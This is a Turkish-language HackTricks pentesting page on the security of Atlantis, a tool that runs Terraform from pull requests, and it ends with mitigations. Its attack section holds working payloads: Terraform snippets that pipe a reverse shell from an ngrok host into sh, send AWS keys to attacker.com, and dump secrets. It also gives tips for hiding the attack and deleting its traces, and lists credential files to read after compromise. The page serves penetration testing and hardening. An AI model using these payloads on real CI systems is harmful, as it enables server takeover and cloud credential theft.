# Atlantis Security

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

### Temel Bilgiler

Atlantis, temel olarak git sunucunuzdan Pull Request'lerden terraform çalıştırmanıza yardımcı olur.

![](<../.gitbook/assets/image (161).png>)

### Yerel Laboratuvar

1. [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) adresindeki **atlantis sürümleri sayfasına** gidin ve **size uygun olanı indirin**.
2. **github** kullanıcınız için bir **kişisel token** (repo erişimi ile) oluşturun.
3. `./atlantis testdrive` komutunu çalıştırın ve **atlantis ile konuşmak için** kullanabileceğiniz bir **demo repo** oluşturacaktır.
4. Web sayfasına 127.0.0.1:4141 adresinden erişebilirsiniz.

### Atlantis Erişimi

#### Git Sunucu Kimlik Bilgileri

**Atlantis**, **Github**, **Gitlab**, **Bitbucket** ve **Azure DevOps** gibi birkaç git sunucusunu destekler.\
Ancak, bu platformlardaki repo'lara erişmek ve işlemler gerçekleştirmek için bazı **ayrıcalıklı erişimlerin verilmesi** gerekir (en azından yazma izinleri).\
[**Belgeler**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional), Atlantis için bu platformlarda özel bir kullanıcı oluşturulmasını teşvik eder, ancak bazı insanlar kişisel hesaplar kullanabilir.

{% hint style="warning" %}
Her durumda, bir saldırgan perspektifinden, **Atlantis hesabı** çok **ilginç** bir **hedef** olacaktır.
{% endhint %}

#### Webhook'lar

Atlantis, Git sunucunuzdan aldığı **webhook'ların** **geçerli** olduğunu doğrulamak için isteğe bağlı olarak [**Webhook gizli anahtarları**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) kullanır.

Bunu doğrulamanın bir yolu, **isteklerin yalnızca Git sunucunuzun IP'lerinden gelmesine izin vermek** olacaktır, ancak daha kolay bir yol Webhook Gizli Anahtarı kullanmaktır.

Özel bir github veya bitbucket sunucusu kullanmadığınız sürece, webhook uç noktalarını internete açmanız gerekeceğini unutmayın.

{% hint style="warning" %}
Atlantis, git sunucusunun bilgi gönderebilmesi için **webhook'ları açığa çıkaracak**. Bir saldırgan perspektifinden, **ona mesaj gönderip gönderemeyeceğinizi** bilmek ilginç olacaktır.
{% endhint %}

#### Sağlayıcı Kimlik Bilgileri <a href="#provider-credentials" id="provider-credentials"></a>

[Belgelerden:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis, **Atlantis'in barındırıldığı** sunucuda `terraform plan` ve `apply` komutlarını **çalıştırarak** Terraform'u çalıştırır. Yerel olarak Terraform çalıştırdığınızda olduğu gibi, Atlantis'in belirli sağlayıcınız için kimlik bilgilerine ihtiyacı vardır.

Atlantis'e belirli sağlayıcınız için [kimlik bilgilerini nasıl sağladığınız](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) size bağlıdır:

* Atlantis [Helm Chart](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) ve [AWS Fargate Modülü](https://www.runatlantis.io/docs/deployment.html#aws-fargate) kendi kimlik bilgileri mekanizmalarına sahiptir. Belgelerini okuyun.
* Atlantis'i bir bulutta çalıştırıyorsanız, birçok bulut, üzerinde çalışan uygulamalara bulut API erişimi sağlama yollarına sahiptir, örneğin:
* [AWS EC2 Rolleri](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Arama "EC2 Rolü")
* [GCE Instance Hizmet Hesapları](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference)
* Birçok kullanıcı, Atlantis'in çalıştığı yerde ortam değişkenleri ayarlar, örn. `AWS_ACCESS_KEY`.
* Diğerleri, Atlantis'in çalıştığı yerde gerekli yapılandırma dosyalarını oluşturur, örn. `~/.aws/credentials`.
* Sağlayıcı kimlik bilgilerini elde etmek için [HashiCorp Vault Provider](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) kullanın.

{% hint style="warning" %}
**Atlantis'in** **çalıştığı** **konteyner**, muhtemelen Atlantis'in Terraform aracılığıyla yönettiği sağlayıcılara (AWS, GCP, Github...) ait **ayrıcalıklı kimlik bilgilerini** içerecektir.
{% endhint %}

#### Web Sayfası

Varsayılan olarak Atlantis, **localhost'ta 4141 portunda bir web sayfası çalıştıracaktır**. Bu sayfa, yalnızca atlantis apply'i etkinleştirmenize/devre dışı bırakmanıza ve repo'ların plan durumunu kontrol etmenize ve kilidini açmanıza izin verir (şeyleri değiştirmeye izin vermez, bu yüzden çok faydalı değildir).

Muhtemelen internete açılmış olarak bulamayacaksınız, ancak varsayılan olarak **erişim için kimlik bilgilerine ihtiyaç yoktur** (ve eğer varsa `atlantis`:`atlantis` **varsayılan** olanlardır).

### Sunucu Yapılandırması

`atlantis server` yapılandırması, komut satırı bayrakları, ortam değişkenleri, bir yapılandırma dosyası veya bunların bir karışımı aracılığıyla belirtilebilir.

* Atlantis sunucusu tarafından desteklenen [**bayrakların listesini buradan**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) bulabilirsiniz.
* Bir yapılandırma seçeneğini bir ortam değişkenine dönüştürmenin [**yolunu buradan**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables) bulabilirsiniz.

Değerler **bu sırayla seçilir**:

1. Bayraklar
2. Ortam Değişkenleri
3. Yapılandırma Dosyası

{% hint style="warning" %}
Yapılandırmada **tokenlar ve şifreler** gibi ilginç değerler bulabileceğinizi unutmayın.
{% endhint %}

#### Repo Yapılandırması

Bazı yapılandırmalar, **repo'ların nasıl yönetildiğini** etkiler. Ancak, **her repo'nun farklı ayarları gerektirmesi** mümkündür, bu nedenle her repo'yu belirtmenin yolları vardır. Öncelik sırası şudur:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) dosyası. Bu dosya, atlantis'in repo'yu nasıl ele alması gerektiğini belirtmek için kullanılabilir. Ancak, varsayılan olarak bazı anahtarların burada belirtilmesine izin verilmez.
2. Muhtemelen `allowed_overrides` veya `allow_custom_workflows` gibi bayraklarla izin verilmesi gerekir.
3. [**Sunucu Tarafı Yapılandırması**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): `--repo-config` bayrağı ile geçirebilirsiniz ve bu, her repo için yeni ayarları yapılandıran bir yaml'dır (regex desteklenir).
4. **Varsayılan** değerler.

**PR Koruma Önlemleri**

Atlantis, **PR**'nin başka biri tarafından **`onaylanmasını`** (bu, dal korumasında ayarlanmamış olsa bile) ve/veya **`birleştirilebilir`** (dal korumaları geçildi) olmasını belirtmenize izin verir **apply çalıştırmadan önce**. Güvenlik açısından, her iki seçeneği de ayarlamak önerilir.

`allowed_overrides` True olduğunda, bu ayarlar **her projede `/atlantis.yml` dosyası ile** **üstü kapatılabilir**.

**Betikler**

Repo yapılandırması, bir **iş akışı yürütülmeden önce** [**çalıştırılacak betikleri**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_ön iş akışı kancaları_) ve [**sonrasında**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_son iş akışı kancaları_) **belirleyebilir.**

Bu betikleri **repo `/atlantis.yml`** dosyasında **belirlemeye** izin veren herhangi bir seçenek yoktur.

**İş Akışı**

Repo yapılandırmasında (sunucu tarafı yapılandırması) [**yeni bir varsayılan iş akışı**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow) belirtebilir veya [**yeni özel iş akışları**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)** oluşturabilirsiniz.** Ayrıca, **hangi repo'ların** oluşturulan **yeni** iş akışlarına **erişebileceğini** de **belirtebilirsiniz.**\
Daha sonra, her repo'nun **atlantis.yaml** dosyasının **kullanılacak iş akışını belirtmesine** izin verebilirsiniz.

{% hint style="danger" %}
Eğer [**sunucu tarafı yapılandırması**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayrağı `allow_custom_workflows` **True** olarak ayarlanmışsa, iş akışları her repo'nun **`atlantis.yaml`** dosyasında **belirlenebilir**. Ayrıca, **`allowed_overrides`**'ın **`workflow`**'u da **üstü kapatması** gerekebilir.\
Bu, temelde **Atlantis sunucusunda bu repo'ya erişebilen herhangi bir kullanıcıya RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

**Conftest Politika Kontrolü**

Atlantis, plan çıktısına karşı **sunucu tarafında** [**conftest**](https://www.conftest.dev/) **politikalarının** çalıştırılmasını destekler. Bu adımı kullanmanın yaygın kullanım senaryoları şunlardır:

* Bir modül listesinin kullanımını reddetmek
* Bir kaynağın oluşturulma zamanındaki niteliklerini doğrulamak
* İstemeden kaynak silmelerini yakalamak
* Güvenlik risklerini önlemek (yani, güvenli portları halka açmak)

Bunu nasıl yapılandıracağınızı [**belgelere**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works) bakarak kontrol edebilirsiniz.

### Atlantis Komutları

[**Belgelere**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) bakarak Atlantis'i çalıştırmak için kullanabileceğiniz seçenekleri bulabilirsiniz:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
### Saldırılar

{% hint style="warning" %}
Eğer istismar sırasında bu **hata** ile karşılaşırsanız: `Error: Error acquiring the state lock`

Bunu çalıştırarak düzeltebilirsiniz:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

#### Atlantis plan RCE - Yeni PR'de yapılandırma değişikliği

Bir depoya yazma erişiminiz varsa, üzerinde yeni bir dal oluşturabilir ve bir PR oluşturabilirsiniz. Eğer **`atlantis plan`** komutunu **çalıştırabiliyorsanız (ya da belki otomatik olarak çalıştırılıyorsa)**, **Atlantis sunucusunda RCE yapabilirsiniz**.

Bunu, [**Atlantis'in harici bir veri kaynağını yüklemesini sağlayarak**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) yapabilirsiniz. `main.tf` dosyasına aşağıdaki gibi bir yük yerleştirin:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**Gizli Saldırı**

Bu saldırıyı daha **gizli bir şekilde** gerçekleştirebilirsiniz, bu önerileri takip ederek:

* Rev shell'i doğrudan terraform dosyasına eklemek yerine, rev shell'i içeren **harici bir kaynağı** **yükleyebilirsiniz**:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
You can find the rev shell code in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* Dış kaynakta, **ref** özelliğini kullanarak **repo içindeki bir dalda terraform rev shell kodunu gizleyin**, şöyle bir şey: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* Atlantis'i tetiklemek için **master'a bir PR oluşturmak yerine**, **2 dal oluşturun** (test1 ve test2) ve birinden diğerine **PR oluşturun**. Saldırıyı tamamladıktan sonra, sadece **PR'yi ve dalları kaldırın**.

#### Atlantis plan Secrets Dump

Terraform dosyasına şöyle bir şey koyarak `atlantis plan` (`terraform plan`) çalıştırarak **terraform tarafından kullanılan gizli anahtarları dökebilirsiniz**:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
#### Atlantis apply RCE - Yeni PR'de Konfigürasyon Değişikliği

Eğer bir depoya yazma erişiminiz varsa, üzerinde yeni bir dal oluşturabilir ve bir PR oluşturabilirsiniz. Eğer **`atlantis apply` komutunu çalıştırabiliyorsanız, Atlantis sunucusunda RCE gerçekleştirebilirsiniz**.

Ancak genellikle bazı korumaları aşmanız gerekecektir:

* **Birleştirilebilir**: Eğer bu koruma Atlantis'te ayarlanmışsa, yalnızca **PR birleştirilebilir olduğunda `atlantis apply` çalıştırabilirsiniz** (bu, dal korumasının aşılması gerektiği anlamına gelir).
* Potansiyel [**dal koruma aşmaları**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md) kontrol edin.
* **Onaylı**: Eğer bu koruma Atlantis'te ayarlanmışsa, `atlantis apply` komutunu çalıştırmadan önce **başka bir kullanıcının PR'yi onaylaması gerekir**.
* Varsayılan olarak, bu korumayı aşmak için [**Gitbot token'ını kötüye kullanabilirsiniz**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md).

Kötü niyetli bir Terraform dosyasında **`terraform apply` çalıştırmak için** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Sadece `main.tf` dosyasının sonunda aşağıdaki gibi bir yükün bulunduğundan emin olmalısınız:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Önceki teknikten **önerileri takip ederek** bu saldırıyı **gizli bir şekilde** gerçekleştirin.

#### Terraform Param Injection

`atlantis plan` veya `atlantis apply` çalıştırıldığında, terraform altında çalıştırılmaktadır, atlantis'ten terraform'a komutlar geçirebilirsiniz, şöyle bir yorum yaparak:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Bir şey geçirebileceğiniz env değişkenleri, bazı korumaları aşmanıza yardımcı olabilir. Terraform env değişkenlerini kontrol edin [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

#### Özel İş Akışı

Bir `atlantis.yaml` dosyasında belirtilen **kötü niyetli özel derleme komutlarını** çalıştırmak. Atlantis, pull request dalından **`atlantis.yaml`** dosyasını kullanır, **master**'dan değil.\
Bu olasılık daha önceki bir bölümde belirtilmiştir:

{% hint style="danger" %}
Eğer [**sunucu tarafı yapılandırma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayrağı `allow_custom_workflows` **True** olarak ayarlandıysa, iş akışları her repo için **`atlantis.yaml`** dosyasında **belirtilmiş** olabilir. Ayrıca, kullanılacak iş akışını **geçersiz kılmak için** **`allowed_overrides`**'ın da **`workflow`**'u belirtmesi potansiyel olarak gereklidir.

Bu, **o repoya erişebilen herhangi bir kullanıcıya Atlantis sunucusunda RCE verecektir**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Plan/apply korumalarını atlatma

Eğer [**sunucu tarafı yapılandırma**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) bayrağı `allowed_overrides` _için_ `apply_requirements` yapılandırılmışsa, bir repo **plan/apply korumalarını değiştirebilir ve bunları atlatabilir**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
#### PR Hijacking

Eğer biri **`atlantis plan/apply` yorumları gönderirse geçerli pull request'lerinize,** bu terraform'un istemediğiniz bir zamanda çalışmasına neden olur.

Ayrıca, eğer **branch protection** ayarlarında her PR için **yeni bir commit gönderildiğinde** **yeniden değerlendirme** istemiyorsanız, biri terraform konfigürasyonuna **kötü niyetli konfigürasyonlar** yazabilir (önceki senaryolara bakın), `atlantis plan/apply` çalıştırabilir ve RCE elde edebilir.

Bu, Github branch koruma ayarındaki **ayar**dır:

![](<../.gitbook/assets/image (216).png>)

#### Webhook Secret

Eğer kullanılan **webhook secret'ını çalmayı başarırsanız** veya **hiçbir webhook secret'ı kullanılmıyorsa**, **Atlantis webhook'unu çağırabilir** ve **atlantis komutlarını** doğrudan çalıştırabilirsiniz.

#### Bitbucket

Bitbucket Cloud **webhook secret'larını desteklememektedir**. Bu, saldırganların **Bitbucket'tan gelen istekleri taklit etmesine** olanak tanıyabilir. Sadece Bitbucket IP'lerine izin verdiğinizden emin olun.

* Bu, bir **saldırganın** **Atlantis'e** Bitbucket'tan geliyormuş gibi görünen **sahte istekler** gönderebileceği anlamına gelir.
* Eğer `--repo-allowlist` belirtiyorsanız, yalnızca o reposuna ait sahte istekler yapabilirler, bu nedenle verebilecekleri en büyük zarar kendi reposunuzda plan/apply yapmak olacaktır.
* Bunu önlemek için [Bitbucket'ın IP adreslerini](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) beyaz listeye alın (Çıkış IPv4 adreslerine bakın).

### Post-Exploitation

Eğer sunucuya erişim sağladıysanız veya en azından bir LFI elde ettiyseniz, okumanız gereken bazı ilginç şeyler var:

* `/home/atlantis/.git-credentials` VCS erişim kimlik bilgilerini içerir
* `/atlantis-data/atlantis.db` Daha fazla bilgi ile birlikte VCS erişim kimlik bilgilerini içerir
* `/atlantis-data/repos/<org_name>`_`/`_`<repo_name>/<pr_num>/<workspace>/<path_to_dir>/.terraform/terraform.tfstate` Terraform durum dosyası
* Örnek: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Çevre değişkenleri
* `/proc/[2-20]/cmdline` `atlantis server` komut satırı (hassas veriler içerebilir)

### Mitigations

#### Don't Use On Public Repos <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Herkesin kamuya açık pull request'lere yorum yapabileceği için, mevcut tüm güvenlik önlemlerine rağmen, güvenlik ayarlarının uygun bir şekilde yapılandırılmadığı kamuya açık reposlarda Atlantis çalıştırmak hala tehlikelidir.

#### Don't Use `--allow-fork-prs` <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

Eğer kamuya açık bir repoda çalışıyorsanız (bu önerilmez, yukarıya bakın) `--allow-fork-prs` ayarını yapmamalısınız (varsayılan olarak false) çünkü herkes kendi fork'undan sizin repoya bir pull request açabilir.

#### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis, `--repo-allowlist` bayrağı aracılığıyla kabul edeceği repoların bir beyaz listesini belirtmenizi gerektirir. Örneğin:

* Belirli repolar: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Tüm organizasyonunuz: `--repo-allowlist=github.com/runatlantis/*`
* GitHub Enterprise kurulumunuzdaki her repo: `--repo-allowlist=github.yourcompany.com/*`
* Tüm repolar: `--repo-allowlist=*`. Korunan bir ağda olduğunuzda yararlıdır ama bir webhook secret'ı ayarlamadan tehlikelidir.

Bu bayrak, Atlantis kurulumunuzun kontrol etmediğiniz repolarla kullanılmadığından emin olur. Daha fazla bilgi için `atlantis server --help` komutuna bakın.

#### Protect Terraform Planning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

Eğer saldırganların kötü niyetli Terraform kodu ile pull request göndermesi tehdit modelinizde varsa, `terraform apply` onaylarının yeterli olmadığını bilmelisiniz. [`external` veri kaynağını](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data_source) kullanarak veya kötü niyetli bir sağlayıcı belirterek `terraform plan` içinde kötü niyetli kod çalıştırmak mümkündür. Bu kod, kimlik bilgilerinizi dışarı sızdırabilir.

Bunu önlemek için şunları yapabilirsiniz:

1. Sağlayıcıları Atlantis imajına dahil edin veya barındırın ve üretimde çıkışı reddedin.
2. Sağlayıcı kayıt protokolünü dahili olarak uygulayın ve kamuya açık çıkışı reddedin, böylece kayıt üzerinde yazma erişimine kimin sahip olduğunu kontrol edersiniz.
3. [Sunucu tarafı repo yapılandırmanızı](https://www.runatlantis.io/docs/server-side-repo-config.html)'nın `plan` adımını, yasaklı sağlayıcılar veya veri kaynakları veya izin verilmeyen kullanıcılardan gelen PR'ler ile karşılaştıracak şekilde değiştirin. Bu noktada ek doğrulama da ekleyebilirsiniz, örneğin `plan`'ın devam etmesine izin vermeden önce PR'da "beğeni" gerektirmek gibi. Conftest burada faydalı olabilir.

#### Webhook Secrets <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis, `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` ortam değişkenleri aracılığıyla ayarlanmış Webhook secret'ları ile çalıştırılmalıdır. `--repo-allowlist` bayrağı ayarlı olsa bile, bir webhook secret'ı olmadan, saldırganlar izin verilen bir repo gibi davranarak Atlantis'e istek gönderebilir. Webhook secret'ları, webhook isteklerinin gerçekten VCS sağlayıcınızdan (GitHub veya GitLab) geldiğini garanti eder.

Eğer Azure DevOps kullanıyorsanız, webhook secret'ları yerine temel bir kullanıcı adı ve şifre ekleyin.

#### Azure DevOps Basic Authentication <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps, tüm webhook olaylarında temel kimlik doğrulama başlığı göndermeyi destekler. Bu, webhook konumunuz için HTTPS URL'si kullanmayı gerektirir.

#### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

Eğer webhook secret'ları kullanıyorsanız ama trafiğiniz HTTP üzerinden ise, webhook secret'ları çalınabilir. `--ssl-cert-file` ve `--ssl-key-file` bayraklarını kullanarak SSL/HTTPS'yi etkinleştirin.

#### Enable Authentication on Atlantis Web Server <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Web hizmetinde kimlik doğrulamayı etkinleştirmek şiddetle önerilir. `--web-basic-auth=true` kullanarak BasicAuth'u etkinleştirin ve `--web-username=yourUsername` ve `--web-password=yourPassword` bayraklarını kullanarak bir kullanıcı adı ve şifre ayarlayın.

Ayrıca bunları ortam değişkenleri olarak da geçebilirsiniz `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=yourUsername` ve `ATLANTIS_WEB_PASSWORD=yourPassword`.

### References

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
